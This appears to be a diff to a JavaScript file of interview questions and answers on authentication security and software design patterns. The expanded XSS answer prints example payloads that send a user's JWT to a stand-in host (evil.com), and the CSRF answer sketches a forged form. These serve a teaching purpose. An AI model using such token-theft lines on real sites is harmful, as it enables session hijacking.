+BLACKLIST in Redis:
+  SET "revoked:abc123" "" EX 900  // expires in 15 min
+
+// Strategy 3: Server-side refresh token store (recommended)
+On logout:
+  → Delete refresh token from database
+  → Access token expires naturally (short-lived)
+  → User can't get new access tokens
+
+// Strategy 4: Token versioning
+User table: { id, tokenVersion: 5 }
+JWT payload: { userId: 123, tokenVersion: 5 }
+On logout: increment tokenVersion to 6
+→ All existing tokens with version 5 become invalid</pre>
+<div class="key-point">The practical approach: short-lived access tokens (5 min) + revocable server-side refresh tokens. Immediate logout everywhere needs a revocation store (Redis blacklist or token versioning).</div>`,
         },
         {
           q: 'What is the difference between OAuth 2.0 and JWT?',
           difficulty: 'medium',
           a: `<ul>
-<li><strong>OAuth 2.0</strong>: authorization framework.</li>
-<li><strong>JWT</strong>: token format.</li>
+<li><strong>OAuth 2.0</strong>: an <strong>authorization framework</strong> that defines flows for granting access. It specifies WHO can access WHAT.</li>
+<li><strong>JWT</strong>: a <strong>token format</strong> that encodes claims as JSON. It's a container, not a protocol.</li>
 </ul>
-<div class="key-point">OAuth can issue JWT tokens, but JWT can also be used outside OAuth.</div>`,
+<pre>OAuth 2.0 can use different token formats:
+  - JWT (self-contained, no DB lookup needed)
+  - Opaque tokens (random string, server must look up)
+
+JWT can be used outside OAuth:
+  - Session replacement in your own auth system
+  - API key alternative
+  - Service-to-service authentication
+
+// Typical combination:
+OAuth 2.0 Authorization Server → issues JWT access tokens
+Resource Server → validates JWT without calling auth server</pre>
+<div class="key-point">OAuth 2.0 is the "process" (how to get a token). JWT is the "envelope" (what the token looks like). They're complementary, not competing.</div>`,
         },
         {
           q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
           difficulty: 'medium',
-          a: `<p><strong>OpenID Connect (OIDC)</strong> adds identity on top of OAuth 2.0.</p>
-<ul>
-<li>OAuth answers delegated access.</li>
-<li>OIDC answers who the user is.</li>
-</ul>
-<div class="key-point">If someone asks about login with Google, OIDC is usually part of the real answer.</div>`,
+          a: `<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
+<pre>OAuth 2.0 alone:
+  "This app can access your Google Drive photos"
+  → Authorization (access to resources)
+  → Doesn't tell you WHO the user is
+
+OIDC adds:
+  "The user is john@gmail.com, their name is John Doe"
+  → Authentication (identity verification)
+  → Returns an ID Token (JWT) with user info
+
+// OIDC flow:
+1. App redirects to Google: scope=openid email profile
+2. User logs in on Google
+3. Google returns:
+   - Access Token (OAuth): for API access
+   - ID Token (OIDC): JWT with user identity
+   - Refresh Token: for renewing access
+
+// ID Token payload:
+{
+  "iss": "https://accounts.google.com",
+  "sub": "1234567890",        // unique user ID
+  "email": "john@gmail.com",
+  "name": "John Doe",
+  "picture": "https://...",
+  "exp": 1699999999
+}</pre>
+<div class="key-point">When someone says "Login with Google/GitHub/Microsoft", that's OIDC in action. OAuth 2.0 handles the authorization, OIDC adds the user identity on top.</div>`,
         },
         {
           q: 'What is the difference between RBAC and ABAC?',
           difficulty: 'medium',
           a: `<ul>
-<li><strong>RBAC</strong>: permissions based on role, such as ADMIN or EDITOR.</li>
-<li><strong>ABAC</strong>: permissions based on attributes, such as department, location, resource owner, or time.</li>
+<li><strong>RBAC (Role-Based Access Control)</strong>: permissions granted based on user's role.</li>
+<li><strong>ABAC (Attribute-Based Access Control)</strong>: permissions based on attributes of user, resource, environment.</li>
 </ul>
-<div class="key-point">RBAC is simpler. ABAC is more flexible but harder to reason about and maintain.</div>`,
+<pre>// RBAC: simple role checks
+if (user.role === "ADMIN") → allow DELETE /users
+if (user.role === "EDITOR") → allow PUT /articles
+if (user.role === "VIEWER") → allow GET /articles
+
+// ABAC: attribute-based rules (more flexible)
+ALLOW if:
+  user.department === resource.department AND
+  user.clearanceLevel >= resource.sensitivityLevel AND
+  currentTime is within businessHours AND
+  request.ipAddress is in allowedNetwork
+
+// Example:
+"A doctor can view patient records ONLY in their own department,
+ ONLY during working hours, ONLY from hospital network"
+→ RBAC can't express this easily, ABAC can</pre>
+<table><tr><th>Aspect</th><th>RBAC</th><th>ABAC</th></tr>
+<tr><td>Complexity</td><td>Simple</td><td>Complex</td></tr>
+<tr><td>Granularity</td><td>Coarse (role-level)</td><td>Fine (attribute-level)</td></tr>
+<tr><td>Scalability</td><td>Role explosion risk</td><td>Scales with policies</td></tr>
+<tr><td>Best for</td><td>Most web apps</td><td>Healthcare, finance, government</td></tr></table>
+<div class="key-point">Start with RBAC for most applications. Move to ABAC when you need rules like "users can only edit their own department's documents during business hours."</div>`,
         },
         {
           q: 'What is the difference between CORS and CSRF?',
           difficulty: 'medium',
-          a: `<ul>
-<li><strong>CORS</strong>: browser rule about cross-origin JavaScript requests.</li>
-<li><strong>CSRF</strong>: attack that tricks a browser into sending unwanted authenticated requests.</li>
+          a: `<p>Two completely different security concepts that are often confused:</p>
+<ul>
+<li><strong>CORS (Cross-Origin Resource Sharing)</strong>: A browser security <strong>mechanism</strong> that controls which origins can make requests to your API.</li>
+<li><strong>CSRF (Cross-Site Request Forgery)</strong>: An <strong>attack</strong> where a malicious site tricks a user's browser into making unwanted requests to your API.</li>
 </ul>
-<div class="key-point">CORS is not a full API security mechanism. CSRF is an attack pattern.</div>`,
+<pre>// CORS: browser blocks cross-origin requests by default
+// Your app: https://myapp.com
+// Your API: https://api.myapp.com
+// Browser: "Different origin! Block unless API says it's OK"
+
+// Server response headers:
+Access-Control-Allow-Origin: https://myapp.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Authorization, Content-Type
+
+// CSRF attack:
+// 1. User is logged into bank.com (has session cookie)
+// 2. User visits evil.com
+// 3. evil.com has: &lt;form action="bank.com/transfer" method="POST"&gt;
+// 4. Browser automatically includes bank.com cookies → transfer happens!
+
+// CSRF protection:
+// - SameSite cookies (SameSite=Strict or Lax)
+// - CSRF tokens (random token in form, verified server-side)
+// - Check Origin/Referer headers</pre>
+<div class="key-point">CORS is a protection mechanism (allow/block). CSRF is an attack pattern (exploit). CORS alone does NOT prevent CSRF. You need SameSite cookies or CSRF tokens.</div>`,
         },
         {
           q: 'What is XSS and why does it matter for token-based auth?',
           difficulty: 'hard',
-          a: `<p><strong>XSS</strong> means attacker-controlled JavaScript runs in your page.</p>
+          a: `<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
+<pre>// Three types:
+1. Stored XSS: malicious script saved in DB, served to all users
+   Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;
+
+2. Reflected XSS: malicious script in URL parameter
+   https://myapp.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;
+
+3. DOM-based XSS: script manipulates DOM unsafely
+   document.innerHTML = userInput;  // DANGEROUS!</pre>
+<p><strong>Impact on auth:</strong></p>
+<pre>// If token is in localStorage:
+localStorage.getItem('accessToken')  // attacker reads it!
+fetch('https://evil.com/steal?token=' + token)  // sends to attacker
+
+// If token is in HttpOnly cookie:
+document.cookie  // can't read HttpOnly cookies ✅
+// BUT attacker can still make requests AS the user from the page</pre>
+<p><strong>Prevention:</strong></p>
 <ul>
-<li>Can steal tokens from localStorage.</li>
-<li>Can act as the user in the current session.</li>
-<li>Mitigate with output encoding, CSP, sanitization, and framework-safe rendering.</li>
+<li><strong>Output encoding</strong>: escape user content before rendering in HTML</li>
+<li><strong>CSP headers</strong>: <code>Content-Security-Policy: script-src 'self'</code></li>
+<li><strong>Framework safe rendering</strong>: React auto-escapes by default, Angular sanitizes</li>
+<li><strong>Never use</strong>: <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>eval()</code> with user input</li>
 </ul>
-<div class="key-point">Even perfect JWT validation does not save you if malicious JavaScript runs in the browser.</div>`,
+<div class="key-point">Even with HttpOnly cookies, XSS can act AS the user (make API calls, change data). XSS prevention is critical regardless of token storage strategy.</div>`,
         },
         {
           q: 'What is mTLS and when would you use it between services?',
           difficulty: 'hard',
-          a: `<p><strong>mTLS</strong> means both sides of a connection verify each other with certificates.</p>
+          a: `<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
+<pre>Regular TLS (HTTPS):
+  Client → verifies server certificate → encrypted connection
+  Server doesn't verify client identity
+
+mTLS:
+  Client → verifies server certificate ✅
+  Server → verifies client certificate ✅
+  Both sides know who they're talking to</pre>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>Each service has its own certificate signed by a trusted CA</li>
+<li>On connection: server presents cert → client verifies</li>
+<li>Client presents cert → server verifies</li>
+<li>Both verified → encrypted communication established</li>
+</ol>
+<p><strong>When to use:</strong></p>
 <ul>
-<li>Encrypts traffic in transit.</li>
-<li>Gives strong service identity.</li>
+<li>Service-to-service communication in microservices (zero-trust network)</li>
+<li>API access for trusted partners (banking, healthcare)</li>
+<li>IoT device authentication</li>
 </ul>
-<div class="key-point">JWT proves user context. mTLS proves service identity. They solve different security problems.</div>`,
+<pre>// Common setup: service mesh handles mTLS automatically
+// Istio/Linkerd inject sidecar proxies that handle certificates
+// No code changes needed in your services</pre>
+<div class="key-point">JWT proves user context (who is the user). mTLS proves service identity (which service is calling). They solve different problems and are often used together: mTLS between services + JWT for user context.</div>`,
         },
         {
           q: 'What is the difference between symmetric and asymmetric JWT signing?',
           difficulty: 'hard',
-          a: `<ul>
-<li><strong>Symmetric</strong>: same secret signs and verifies.</li>
-<li><strong>Asymmetric</strong>: private key signs, public key verifies.</li>
-</ul>
-<div class="key-point">Asymmetric signing is better when many services need verification but only one trusted authority should sign.</div>`,
+          a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Aspect</th><th style="padding:6px;border-bottom:1px solid #ccc;">Symmetric (HS256)</th><th style="padding:6px;border-bottom:1px solid #ccc;">Asymmetric (RS256)</th></tr>
+<tr><td style="padding:6px;">Keys</td><td style="padding:6px;">One shared secret</td><td style="padding:6px;">Private key + Public key</td></tr>
+<tr><td style="padding:6px;">Sign</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Private key (auth server only)</td></tr>
+<tr><td style="padding:6px;">Verify</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Public key (anyone can verify)</td></tr>
+<tr><td style="padding:6px;">Secret distribution</td><td style="padding:6px;">Must share secret with all verifiers</td><td style="padding:6px;">Only public key shared (safe)</td></tr>
+</table>
+<pre>// Symmetric (HS256): one secret for both signing and verifying
+HMACSHA256(payload, "my-shared-secret")
+// Every service that verifies tokens needs the secret → security risk
+
+// Asymmetric (RS256): separate keys
+Sign with PRIVATE key (only auth server has this)
+Verify with PUBLIC key (published at /.well-known/jwks.json)
+// Any service can verify without knowing the signing key!
+
+// JWKS endpoint:
+GET https://auth.myapp.com/.well-known/jwks.json
+→ { "keys": [{ "kty": "RSA", "n": "...", "e": "AQAB" }] }</pre>
+<div class="key-point">Use asymmetric (RS256/ES256) when many services need to verify tokens but only one authority should sign. This is the standard approach for microservices and third-party auth providers.</div>`,
         },
         {
           q: 'How do you protect login endpoints from brute-force attacks?',
           difficulty: 'medium',
-          a: `<ul>
-<li>Rate limit by IP and account</li>
-<li>Use MFA for sensitive accounts</li>
-<li>Alert on suspicious patterns</li>
-<li>Hash passwords strongly</li>
+          a: `<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
+<p><strong>Defense layers:</strong></p>
+<ul>
+<li><strong>Rate limiting</strong>: Max 5 attempts per account per 15 minutes</li>
+<li><strong>Progressive delays</strong>: Increase response time after each failure (1s, 2s, 4s...)</li>
+<li><strong>Account lockout with auto-unlock</strong>: Lock for 15 min after 10 failures (not permanent — that's a DoS vector)</li>
+<li><strong>CAPTCHA</strong>: After 3 failures, require CAPTCHA</li>
+<li><strong>MFA</strong>: Even if password is compromised, attacker needs second factor</li>
+<li><strong>Password hashing</strong>: bcrypt/argon2 with high cost factor (makes each attempt slow)</li>
+<li><strong>Monitor & alert</strong>: Detect credential stuffing patterns (many accounts, few attempts each)</li>
 </ul>
-<div class="key-point">Do not rely on account lockout alone. It can become a denial-of-service vector against real users.</div>`,
+<pre>// Rate limiting with Redis:
+String key = "login:" + username + ":" + ip;
+int attempts = redis.incr(key);
+redis.expire(key, 900); // 15 min window
+
+if (attempts > 5) {
+    return Response.status(429)
+        .header("Retry-After", "900")
+        .body("Too many attempts. Try again in 15 minutes.");
+}
+
+// Password hashing (bcrypt):
+String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
+// 12 rounds → ~250ms per hash → brute force is impractical</pre>
+<div class="key-point">Do not rely on account lockout alone — attackers can lock out legitimate users (denial of service). Combine rate limiting + progressive delays + MFA for robust protection.</div>`,
         },
       ],
     },
@@ -1725,6 +2126,139 @@ class AuditHandler extends Handler {
     }
 }</pre>
 <div class="key-point">HTTP middleware and servlet filters are common real-world examples.</div>`,
+        },
+        {
+          q: 'What is the Repository pattern?',
+          difficulty: 'medium',
+          a: `<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
+<pre>// Without Repository: business logic knows about JPA
+entityManager.createQuery("SELECT u FROM User u WHERE u.email = :email")
+    .setParameter("email", email)
+    .getSingleResult();
+
+// With Repository: clean abstraction
+interface UserRepository {
+    Optional&lt;User&gt; findByEmail(String email);
+    List&lt;User&gt; findByRole(String role);
+    void save(User user);
+    void delete(User user);
+}
+
+class JpaUserRepository implements UserRepository {
+    private final EntityManager em;
+
+    public Optional&lt;User&gt; findByEmail(String email) {
+        return em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
+            .setParameter("email", email)
+            .getResultStream().findFirst();
+    }
+    // ...
+}
+
+// Business logic only depends on interface:
+class UserService {
+    private final UserRepository repo; // can swap JPA → MongoDB → in-memory
+
+    User register(String email) {
+        if (repo.findByEmail(email).isPresent()) throw new DuplicateEmailException();
+        User user = new User(email);
+        repo.save(user);
+        return user;
+    }
+}</pre>
+<div class="key-point">Repository makes business logic testable (inject a fake repo in tests) and allows swapping persistence technology without changing domain code. Spring Data JPA auto-generates repository implementations.</div>`,
+        },
+        {
+          q: 'What is Dependency Injection and how does it relate to design patterns?',
+          difficulty: 'medium',
+          a: `<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
+<pre>// ❌ Without DI: tight coupling
+class OrderService {
+    private EmailService emailService = new EmailService(); // hardcoded dependency
+    private PaymentGateway gateway = new StripeGateway();   // can't swap easily
+}
+
+// ✅ With DI: dependencies injected
+class OrderService {
+    private final EmailService emailService;
+    private final PaymentGateway gateway;
+
+    // Constructor injection (preferred)
+    OrderService(EmailService emailService, PaymentGateway gateway) {
+        this.emailService = emailService;
+        this.gateway = gateway;
+    }
+}
+
+// Production: new OrderService(new SmtpEmailService(), new StripeGateway())
+// Testing:    new OrderService(new MockEmailService(), new MockGateway())</pre>
+<p><strong>DI types:</strong></p>
+<ul>
+<li><strong>Constructor injection</strong> (recommended): all dependencies in constructor, object is always valid</li>
+<li><strong>Setter injection</strong>: optional dependencies, can change at runtime</li>
+<li><strong>Field injection</strong>: Spring @Autowired on fields — convenient but harder to test</li>
+</ul>
+<div class="key-point">DI applies the Dependency Inversion Principle (the "D" in SOLID): depend on abstractions, not concrete classes. Spring, Angular, and .NET all have built-in DI containers.</div>`,
+        },
+        {
+          q: 'What are SOLID principles? Give a brief example of each.',
+          difficulty: 'hard',
+          a: `<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
+<pre>S - Single Responsibility: One class = one reason to change
+  ❌ UserService handles login, email sending, and PDF generation
+  ✅ UserService handles login; EmailService handles email; PdfService handles PDF
+
+O - Open/Closed: Open for extension, closed for modification
+  ❌ if (type == "pdf") ... else if (type == "csv") ... // modify to add new type
+  ✅ interface Exporter { void export(); } // extend by adding new class
+
+L - Liskov Substitution: Subtype must work wherever parent type is expected
+  ❌ class Square extends Rectangle { setWidth() { also sets height } }
+     // violates: Rectangle user expects width/height to be independent
+  ✅ Use separate Shape interface for Square and Rectangle
+
+I - Interface Segregation: Don't force classes to implement methods they don't use
+  ❌ interface Worker { void code(); void manageMeetings(); void cook(); }
+  ✅ interface Coder { void code(); }
+     interface Manager { void manageMeetings(); }
+
+D - Dependency Inversion: Depend on abstractions, not concretions
+  ❌ class OrderService { private MySqlRepo repo = new MySqlRepo(); }
+  ✅ class OrderService { private Repository repo; // interface injected }</pre>
+<div class="key-point">SOLID principles are heavily asked in interviews. Know one concrete example for each. The most commonly tested are Single Responsibility (S) and Dependency Inversion (D).</div>`,
+        },
+        {
+          q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
+          difficulty: 'tricky',
+          a: `<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
+<table><tr><th>Pattern</th><th>Purpose</th><th>Interface</th><th>Example</th></tr>
+<tr><td><strong>Adapter</strong></td><td>Convert incompatible interface</td><td>Changes interface</td><td>Legacy API → new interface</td></tr>
+<tr><td><strong>Facade</strong></td><td>Simplify complex subsystem</td><td>New simplified interface</td><td>checkout() wraps 5 services</td></tr>
+<tr><td><strong>Proxy</strong></td><td>Control access to real object</td><td>Same interface as real</td><td>Lazy load, security check, caching</td></tr></table>
+<pre>// Adapter: makes incompatible interface compatible
+class OldPaymentAdapter implements NewPaymentInterface {
+    private OldPaymentSystem old;
+    void pay(Money m) { old.makePayment(m.toCents()); } // adapts interface
+}
+
+// Facade: simplifies multiple subsystems
+class OrderFacade {
+    void placeOrder() {
+        inventoryService.reserve();  // hides complexity
+        paymentService.charge();     // of multiple services
+        emailService.notify();       // behind one method
+    }
+}
+
+// Proxy: same interface, adds behavior
+class CachingUserProxy implements UserService {
+    private UserService real;
+    User getUser(int id) {
+        if (cache.has(id)) return cache.get(id);  // adds caching
+        return real.getUser(id);                    // same interface
+    }
+}</pre>
+<div class="key-point">Trick question tip: If asked "which pattern wraps another object?" — all three do! The difference is WHY: Adapter = interface mismatch, Facade = simplification, Proxy = access control.</div>`,
         },
       ],
     },
